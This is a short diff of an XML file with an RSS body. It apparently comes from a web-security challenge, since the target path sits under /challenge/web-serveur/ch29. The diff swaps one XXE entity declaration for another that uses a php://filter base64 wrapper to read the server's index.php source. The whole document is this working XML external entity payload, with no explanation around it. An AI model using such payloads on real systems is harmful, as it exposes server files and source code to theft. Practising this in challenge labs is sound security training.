@@ -2,8 +2,7 @@
 
  
  <!DOCTYPE foo [  
-   <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "ls" >]><foo>&xxe;</foo>
+   <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php" >]><foo>&xxe;</foo>
 
 <rss version="2.0">
     <channel>
